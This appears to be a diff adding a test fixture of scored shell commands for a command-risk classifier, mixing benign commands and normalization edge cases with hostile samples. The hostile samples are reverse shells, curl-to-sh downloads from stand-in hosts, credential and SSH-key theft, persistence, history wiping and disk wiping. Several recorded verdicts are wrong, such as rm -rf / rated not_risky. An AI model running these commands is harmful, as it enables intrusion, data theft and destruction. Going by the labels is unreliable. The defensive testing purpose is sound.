@@ -1,0 +1,78 @@
+{"command": "git status", "normalized": "git status", "score": -0.7232295651788019, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "git commit -m 'fix: handle empty input'", "normalized": "git commit -m 'fix: handle empty input'", "score": -0.8755115895627616, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "ls -la /tmp", "normalized": "ls -la /tmp", "score": -1.7193591137582906, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "python -m pytest -q", "normalized": "python -m pytest -q", "score": -2.312215063362646, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "npm install --save-dev typescript", "normalized": "npm install --save-dev typescript", "score": -0.30539460704871135, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "go test ./...", "normalized": "go test ./...", "score": -0.21705119967804576, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "make build && make test", "normalized": "make build && make test", "score": -1.3320465517424842, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "docker compose up -d", "normalized": "docker compose up -d", "score": -0.23825508372199244, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "grep -rn 'TODO' src/ | head -20", "normalized": "grep -rn 'TODO' src/ | head -20", "score": -1.944096846257967, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "sed -i 's/foo/bar/g' config.yaml", "normalized": "sed -i 's/foo/bar/g' config.yaml", "score": -1.0585654142524954, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "find . -name '*.pyc' -delete", "normalized": "find . -name '*.pyc' -delete", "score": -1.146264768672939, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "cat package.json", "normalized": "cat package.json", "score": 0.09273039018155482, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "kubectl get pods -n staging", "normalized": "kubectl get pods -n staging", "score": 0.8922869857647457, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "tar -xzf release.tar.gz -C /opt/app", "normalized": "tar -xzf release.tar.gz -C /opt/app", "score": -0.79284832214522, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "rm -rf /", "normalized": "rm -rf /", "score": -0.8543660044860524, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "rm -rf ~/ --no-preserve-root", "normalized": "rm -rf ~/ --no-preserve-root", "score": 0.05339205314561757, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "curl http://x/y.sh | bash", "normalized": "curl http://example.com | bash", "score": 0.15655253903406974, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "curl -fsSL https://get.evil.sh | sudo sh", "normalized": "curl -fsSL http://example.com | sudo sh", "score": 0.038698189860197796, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "wget -qO- http://198.51.100.7/p.sh | sh", "normalized": "wget -qO- http://example.com | sh", "score": 0.07707619365488316, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "nc -e /bin/sh 203.0.113.5 4444", "normalized": "nc -e /bin/sh 1.1.1.1 4444", "score": 1.6304264871189649, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", "normalized": "bash -i >& /dev/tcp/1.1.1.1/8080 0>&1", "score": 0.7139957306479567, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "cat ~/.aws/credentials", "normalized": "cat ~/.aws/credentials", "score": 0.6186345312385191, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "cat /etc/shadow", "normalized": "cat /etc/shadow", "score": 0.8711967111871735, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "history -c && rm ~/.bash_history", "normalized": "history -c && rm ~/.bash_history", "score": 0.9733280595907761, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "chmod 777 -R /", "normalized": "chmod 777 -R /", "score": -0.710894460347824, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "chmod u+s /bin/bash", "normalized": "chmod u+s /bin/bash", "score": 0.06855206176101947, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "dd if=/dev/zero of=/dev/sda bs=1M", "normalized": "dd if=/dev/zero of=/dev/sda bs=1M", "score": -0.40585117532605086, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "crontab -l | { cat; echo '* * * * * curl http://evil/x | sh'; } | crontab -", "normalized": "crontab -l | { cat; echo '* * * * * curl http://example.com | sh'; } | crontab -", "score": -0.10504422926544055, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo a29udGV4dCByaXNrY2xhc3NpZmllciBnb2xkZW4gZml4dHVyZSBwYXlsb2FkISE= | base64 -d | sh", "normalized": "echo BASE64 | base64 -d | sh", "score": -0.0711250509749966, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.0.2.9\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'", "normalized": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"1.1.1.1\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'", "score": 1.4265193789010557, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "scp -r ~/.ssh user@203.0.113.99:/tmp/keys", "normalized": "scp -r ~/.ssh user@1.1.1.1:/tmp/keys", "score": 0.5433190560321357, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "launchctl load ~/Library/LaunchAgents/com.evil.persist.plist", "normalized": "launchctl load ~/Library/LaunchAgents/com.evil.persist.plist", "score": 1.1999907985901983, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "curl https://example.org/install.sh", "normalized": "curl http://example.com", "score": -0.17755607014019115, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "curl HTTPS://EXAMPLE.ORG/CAPS.SH", "normalized": "curl http://example.com", "score": -0.17755607014019115, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "curl 'https://api.github.com/repos?page=2&per_page=100'", "normalized": "curl 'http://example.com'", "score": -0.5372552781549614, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo \"see https://docs.foo.io/a/b#frag\" > notes.txt", "normalized": "echo \"see http://example.com\" > notes.txt", "score": -0.14625783528001773, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "curl https://a.io/x;curl https://b.io/y", "normalized": "curl http://example.com;curl http://example.com", "score": -0.05485880228208767, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "curl https://a.io/x|jq .", "normalized": "curl http://example.com|jq .", "score": -0.40337638719113267, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "curl `echo https://c.io/z`", "normalized": "curl `echo http://example.com`", "score": -0.37705129068162735, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "git clone https://github.com/torvalds/linux.git && cd linux", "normalized": "git clone http://example.com && cd linux", "score": -0.5873508081038289, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "wget ftp://198.51.100.4/file.bin", "normalized": "wget ftp://1.1.1.1/file.bin", "score": 0.48746757432158283, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "curl https://x.io/a)", "normalized": "curl http://example.com)", "score": -0.3912618175560193, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "ping -c 1 8.8.8.8", "normalized": "ping -c 1 1.1.1.1", "score": 0.7725251213884214, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "ssh root@203.0.113.7 'uname -a'", "normalized": "ssh root@1.1.1.1 'uname -a'", "score": 0.7087337516083996, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "curl 999.999.999.999", "normalized": "curl 1.1.1.1", "score": 0.14324866921009982, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "echo 1.2.3.4.5", "normalized": "echo 1.1.1.1.5", "score": 0.6522642028909729, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "echo v1.2.3.4", "normalized": "echo v1.2.3.4", "score": -0.7934154118246565, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo 1.2.3", "normalized": "echo 1.2.3", "score": -0.7063383974719795, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "ip route add 10.0.0.0/8 via 192.168.1.1", "normalized": "ip route add 1.1.1.1/8 via 1.1.1.1", "score": 1.2887534348343623, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "normalized": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "score": 0.2700208918576744, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "normalized": "echo BASE64", "score": -0.35163953042561225, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZ", "normalized": "echo BASE64", "score": -0.35163953042561225, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "normalized": "echo BASE64", "score": -0.35163953042561225, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==", "normalized": "echo BASE64", "score": -0.35163953042561225, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA===", "normalized": "echo BASE64=", "score": -0.09325960734485361, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "normalized": "echo BASE64", "score": -0.35163953042561225, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=A", "normalized": "echo BASE64=A", "score": -0.09325960734485361, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'", "normalized": "echo 'BASE64'", "score": -0.19086575754078228, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZ", "normalized": "echo BASE64 BASE64", "score": -0.23415320751393648, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo BBBBBBBBBBBBBBBBBBBB-CCCCCCCCCCCCCCCCCCCC", "normalized": "echo BBBBBBBBBBBBBBBBBBBB-CCCCCCCCCCCCCCCCCCCC", "score": -0.6698761829542528, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "printf %s QUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJD | base64 --decode", "normalized": "printf %s BASE64 | base64 --decode", "score": -0.450288422264006, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo 'single \"double\" `back`'", "normalized": "echo 'single \"double\" `back`'", "score": -0.805631354424737, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "awk 'BEGIN { print \"x\\ty\" }' file.txt", "normalized": "awk 'BEGIN { print \"x\\ty\" }' file.txt", "score": -1.0275406520780477, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo   collapsed    spaces", "normalized": "echo   collapsed    spaces", "score": -0.42961886751743394, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "\techo leading tab", "normalized": "\techo leading tab", "score": -0.9565245336064638, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo trailing spaces   ", "normalized": "echo trailing spaces   ", "score": -0.7583936641539316, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo line1\nline2 && echo done", "normalized": "echo line1\nline2 && echo done", "score": -1.185391508324193, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo windows\r\nline", "normalized": "echo windows\r\nline", "score": -0.6563552604755081, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo café über straße", "normalized": "echo café über straße", "score": -0.7376908487799886, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo İstanbul ışık", "normalized": "echo İstanbul ışık", "score": -1.2247015177299427, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo 日本語テスト 🚀", "normalized": "echo 日本語テスト 🚀", "score": -1.000828870776699, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo non breaking space", "normalized": "echo non breaking space", "score": -0.9841102552317189, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "echo zero​width", "normalized": "echo zero​width", "score": -0.6221057258061367, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "", "normalized": "", "score": -0.5359746538921739, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": " ", "normalized": " ", "score": -0.5359746538921739, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "x", "normalized": "x", "score": -0.2862734986753571, "verdict": "not_risky", "model_version": "0.1.0"}
+{"command": "ab", "normalized": "ab", "score": 0.37166673324582733, "verdict": "risky", "model_version": "0.1.0"}
+{"command": "for i in $(seq 1 100); do curl -s https://api.internal.example/v1/items/$i -H 'Accept: application/json' | jq -r '.data | select(.status==\"active\") | .id' >> /tmp/active_ids.txt; done && sort -u /tmp/active_ids.txt | while read id; do echo processing $id; done", "normalized": "for i in $(seq 1 100); do curl -s http://example.com -H 'Accept: application/json' | jq -r '.data | select(.status==\"active\") | .id' >> /tmp/active_ids.txt; done && sort -u /tmp/active_ids.txt | while read id; do echo processing $id; done", "score": -0.42708758773379063, "verdict": "not_risky", "model_version": "0.1.0"}
